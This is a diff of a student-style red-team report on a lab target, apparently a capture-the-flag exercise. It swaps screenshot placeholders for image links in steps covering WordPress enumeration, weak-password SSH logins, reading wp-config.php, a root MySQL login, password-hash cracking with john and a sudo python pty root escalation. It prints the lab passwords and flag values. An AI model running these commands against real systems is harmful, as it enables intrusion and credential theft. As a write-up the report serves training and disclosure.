@@ -12,7 +12,8 @@ Nmap scan results for each machine reveal the below services and OS details:
 ```bash
 $ nmap -sV -O 192.168.1.110
 ```
-![](/Final-Project/Target-1-Screenshots/NMAP-Target-1-Scan.png)
+
+![Target-1-Scan](/Target-1-Screenshots/NMAP-Target-1-Scan.png)
 
 This scan identifies the services below as potential points of entry:
 - Target 1
@@ -22,22 +23,31 @@ This scan identifies the services below as potential points of entry:
   - Port 139/tcp | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
   - Port 445/tcp | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 
-_TODO: Fill out the list below. Include severity, and CVE numbers, if possible._
-
 The following vulnerabilities were identified on each target:
 - Target 1
   - Open/Unfiltered Ports 22 & 80
-  [screenshot]
+  
+  ![Target-1-Scan](/Target-1-Screenshots/NMAP-Target-1-Scan.png)
+ 
   - WordPress Enumeration
-  [screenshot]
+  
+  ![Enumerated-Users](/Target-1-Screenshots/Enumerated-Users.png)
+ 
   - Weak User Credentials
-  [screenshot]
+  
+   ![SSH-Login](/Target-1-Screenshots/SSH-Login.png)
+   
   - Misconfigured User Privileges on Target System
-  [screenshot]
+  
+   ![Finding-wp-config](/Target-1-Screenshots/Finding-wp-config-PHP-file.png)
+   
   - Brute Force Attack
-  [screenshot]
+  
+    ![Cracked-Passwords](/Target-1-Screenshots/Cracked-Passwords.png)
+
   - Privilege Escalation (Python Library Hijacking)
-  [screenshot]
+    ![Privilege-Escalation](/Target-1-Screenshots/Privilege-Escalation.png)
+
 
 ### Exploitation
 
@@ -47,13 +57,14 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
     - **Exploit Used**
       - Step 1: WordPress User Enumeration
         - ` wpscan --url http://192.168.1.110/wordpress --enumerate vp,u `
-      [screenshot] 
+         ![WPScan-VPs-&-Users](/Target-1-Screenshots/WPScan-VPs-&-Users.png)
+ 
       - Step 2: SSH Login Using Weak Login Credentials
         - ` ssh michael@192.168.1.110, password: michael `
-        [screenshot]
+        ![SSH-Login](/Target-1-Screenshots/SSH-Login.png)
       - Step 3: File Directory Search
         - ` find . -iname "*flag1*" `
-        [screenshot]
+        ![Flag-1](/Target-1-Screenshots/Flag-1.png)
         
     
   - `flag2.txt`: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
@@ -62,19 +73,19 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
         - ` ls -la /var/www `
       - Step 2: Misconfigured File Privileges
         - ` cat /var/www/flag2.txt `
-      [screenshot]
+      ![Flag-2](/Target-1-Screenshots/Flag-2.png)
 
   - `flag3.txt`: flag3{afc01ab56b50591e7dccf93122770cd2}
     - **Exploit Used**
       - Step 1: Misconfigured File Privileges
         - ` nano /var/www/html/wordpress/wp-config.php `
-        [screenshot]
+        ![Finding-wp-config](/Target-1-Screenshots/Finding-wp-config-PHP-file.png)
       - Step 2: MySQL Login
         - ` mysql --host=localhost --user=root --password=R@v3nSecurity `
-        [screenshot]
+        ![SQL-Login](/Target-1-Screenshots/MySQL-Login.png)
       - Step 3: Database Traversal & Table Enumeration
         - ` SHOW * FROM wp_posts; `
-        [screenshot]
+        ![Flag-3](/Target-1-Screenshots/Flag-3.png)
       
 
   - `flag4.txt`: flag4{715dea6c055b9fe3337544932f2941ce}
@@ -82,16 +93,20 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
       - Step 1: MySQL WordPress Login Credential Enumeration
         ` SELECT user_login,user_pass FROM wp_users; ` 
-        [screenshot]
+        ![MySQL-Credentials](/Target-1-Screenshots/MySQL-Credentials.png)
       - Step 2: Brute Force
         - ` john --wordlist=rockyou.txt wp_hashes.txt `
-        [screenshot]
+        ![Cracked-Passwords](/Target-1-Screenshots/Cracked-Passwords.png)
       - Step 3: SSH Login
         - ` ssh steven@192.168.1.110, password pink84 `
-        [screenshot]
+        ![Secure-User-Shell](/Target-1-Screenshots/Secure-User-Shell.png)
       - Step 4: Sudo Privileges Check
         - ` sudo -l `
-        [screenshot]
+        ![Sudo-Privileges-Check](/Target-1-Screenshots/Sudo-Privileges-Check.png)
       - Step 5: Privilege Escalation with Python Shell Spawn
         - ` sudo python -c 'import pty;pty.spawn("/bin/bash")' `
-        [screenshot]
+        
+        ![Privilege-Escalation](/Target-1-Screenshots/Privilege Escalation.png)
+      -  Flag 4:
+      
+        ![Flag-4](/Target-1-Screenshots/Flag-4.png)
